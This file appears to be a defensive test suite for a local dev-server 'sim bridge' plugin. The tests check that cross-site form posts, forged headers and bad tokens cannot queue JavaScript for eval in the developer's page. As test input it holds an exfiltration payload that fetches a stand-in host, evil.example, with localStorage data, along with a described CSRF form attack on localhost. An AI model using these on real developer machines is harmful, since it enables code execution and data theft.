// The sim bridge runs whatever JavaScript it is handed inside the developer's
// own app page (scripts/sim-bridge.ts). A loopback bind keeps the LAN out; it
// does not keep out the developer's own browser, which will happily post a
// cross-origin form to http://localhost:1420 for any page they visit. These
// tests are that attack, and the fence that has to stop it. Run: bun test.

import { afterAll, beforeAll, expect, test } from "bun:test";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { simBridge } from "../scripts/sim-bridge";
import { fakeReq, fakeRes, fakeServer } from "./sim-bridge-harness";

const dir = mkdtempSync(join(tmpdir(), "sim-bridge-"));

beforeAll(() => {
  process.env.IOS_SIM_BRIDGE_TOKEN_FILE = join(dir, "token");
});
afterAll(() => {
  delete process.env.IOS_SIM_BRIDGE_TOKEN_FILE;
  rmSync(dir, { recursive: true, force: true });
});

// A plugin on a loopback dev server, with its middleware reachable.
function mount() {
  const plugin = simBridge();
  const configResolved = plugin.configResolved as (config: unknown) => void;
  configResolved({ server: { host: undefined } });
  const fake = fakeServer(dir);
  const configureServer = plugin.configureServer as (server: unknown) => void;
  configureServer(fake.server);
  return fake;
}

function token(): string {
  return readFileSync(join(dir, "token"), "utf8").trim();
}

// What `scripts/ios-sim.sh eval` sends.
function driverEval(code: string) {
  return fakeReq("/eval", {
    method: "POST",
    headers: {
      "content-type": "application/x-sim-bridge-eval",
      "x-sim-bridge-token": token(),
    },
    body: code,
  });
}

// What the browser sends for
//   <form action="http://localhost:1420/__sim/eval" method="POST"
//         enctype="text/plain">
// on a page the developer visited. text/plain is one of the three form
// encodings that skip the CORS preflight, so the browser just sends it.
function crossSiteFormPost(code: string, over: Record<string, string> = {}) {
  return fakeReq("/eval", {
    method: "POST",
    headers: {
      origin: "http://evil.example",
      referer: "http://evil.example/post.html",
      "sec-fetch-site": "cross-site",
      "sec-fetch-mode": "navigate",
      "sec-fetch-dest": "document",
      "content-type": "text/plain;charset=UTF-8",
      ...over,
    },
    body: code,
  });
}

const tick = (ms: number) => new Promise((r) => setTimeout(r, ms));

test("a cross-origin form post cannot put code in front of the page", async () => {
  const fake = mount();

  // The page is waiting for work, exactly as the injected client always is.
  const poll = fakeRes();
  const polling = fake.call(fakeReq("/poll", { headers: { "sec-fetch-site": "same-origin" } }), poll);

  const attack = fakeRes();
  void fake.call(crossSiteFormPost("fetch('http://evil.example/?'+localStorage.length)"), attack);
  await attack.ended;

  expect(attack.statusCode).toBe(403);
  // Still waiting: nothing was queued for it.
  await tick(30);
  expect(poll.writableEnded).toBe(false);

  // And the driver's own call still gets through to that same poll.
  const good = fakeRes();
  void fake.call(driverEval("location.href"), good);
  await polling;
  expect(poll.statusCode).toBe(200);
  expect(JSON.parse(poll.body).code).toBe("location.href");
});

test("claiming to be same-origin does not help, because a page cannot drop the headers it is given", async () => {
  const fake = mount();
  const res = fakeRes();
  // The most a page could ever manage: the right origin, the right host, and
  // even a leaked token. It still carries the marks of being a page.
  void fake.call(
    crossSiteFormPost("1", {
      origin: "http://localhost:1420",
      "sec-fetch-site": "same-origin",
      "content-type": "application/x-sim-bridge-eval",
      "x-sim-bridge-token": token(),
    }),
    res,
  );
  await res.ended;
  expect(res.statusCode).toBe(403);
});

test("the token alone stops a non-browser caller that has no business here", async () => {
  const fake = mount();
  const res = fakeRes();
  void fake.call(
    fakeReq("/eval", {
      method: "POST",
      headers: { "content-type": "application/x-sim-bridge-eval", "x-sim-bridge-token": "0".repeat(64) },
      body: "1",
    }),
    res,
  );
  await res.ended;
  expect(res.statusCode).toBe(403);
});

test("a form encoding is not enough to reach eval even from a scriptless caller", async () => {
  const fake = mount();
  const res = fakeRes();
  void fake.call(
    fakeReq("/eval", {
      method: "POST",
      headers: { "content-type": "text/plain", "x-sim-bridge-token": token() },
      body: "1",
    }),
    res,
  );
  await res.ended;
  expect(res.statusCode).toBe(415);
});

test("draining the page log needs the token too", async () => {
  const fake = mount();
  const open = fakeRes();
  void fake.call(fakeReq("/logs"), open);
  await open.ended;
  expect(open.statusCode).toBe(403);

  const withToken = fakeRes();
  void fake.call(fakeReq("/logs", { headers: { "x-sim-bridge-token": token() } }), withToken);
  await withToken.ended;
  expect(withToken.statusCode).toBe(200);
});

test("the page's own endpoints take same-origin calls and refuse cross-site ones", async () => {
  const fake = mount();

  const mine = fakeRes();
  void fake.call(
    fakeReq("/log", {
      method: "POST",
      headers: {
        "sec-fetch-site": "same-origin",
        origin: "http://localhost:1420",
        "content-type": "application/json",
      },
      body: JSON.stringify({ kind: "error", msg: "boom" }),
    }),
    mine,
  );
  await mine.ended;
  expect(mine.statusCode).toBe(200);

  const theirs = fakeRes();
  void fake.call(
    fakeReq("/log", {
      method: "POST",
      headers: {
        "sec-fetch-site": "cross-site",
        origin: "http://evil.example",
        "content-type": "text/plain",
      },
      body: "kind=error",
    }),
    theirs,
  );
  await theirs.ended;
  expect(theirs.statusCode).toBe(403);

  // A webview old enough not to send Sec-Fetch-Site still sends Origin on a
  // POST, and that alone has to be enough to place the caller.
  const elsewhere = fakeRes();
  void fake.call(
    fakeReq("/log", {
      method: "POST",
      headers: { origin: "http://evil.example", "content-type": "application/json" },
      body: JSON.stringify({ kind: "error", msg: "boom" }),
    }),
    elsewhere,
  );
  await elsewhere.ended;
  expect(elsewhere.statusCode).toBe(403);
});

test("a cross-site GET cannot take the work queued for the page", async () => {
  const fake = mount();
  // <img src="http://localhost:1420/__sim/poll"> on any page: a GET carries no
  // Origin at all, so Sec-Fetch-Site is the only thing that places it — and it
  // would otherwise be handed whatever command was waiting for the real page.
  const res = fakeRes();
  void fake.call(fakeReq("/poll", { headers: { "sec-fetch-site": "cross-site", "sec-fetch-dest": "image" } }), res);
  await res.ended;
  expect(res.statusCode).toBe(403);
});

test("the page's endpoints each take one method", async () => {
  const fake = mount();
  const sameOrigin = { "sec-fetch-site": "same-origin", origin: "http://localhost:1420" };

  // A form can only GET or POST, and /poll hands out the queued command: a
  // cross-site form post is refused above, but the shape is refused here too.
  const posted = fakeRes();
  void fake.call(fakeReq("/poll", { method: "POST", headers: sameOrigin, body: "" }), posted);
  await posted.ended;
  expect(posted.statusCode).toBe(405);

  const got = fakeRes();
  void fake.call(fakeReq("/result", { headers: sameOrigin }), got);
  await got.ended;
  expect(got.statusCode).toBe(405);
});

test("a malformed body is answered, not fatal", async () => {
  const fake = mount();
  for (const path of ["/result", "/log"]) {
    const res = fakeRes();
    void fake.call(
      fakeReq(path, {
        method: "POST",
        headers: { "sec-fetch-site": "same-origin", origin: "http://localhost:1420" },
        body: "not json{",
      }),
      res,
    );
    await res.ended;
    expect(res.statusCode).toBe(400);
  }
});
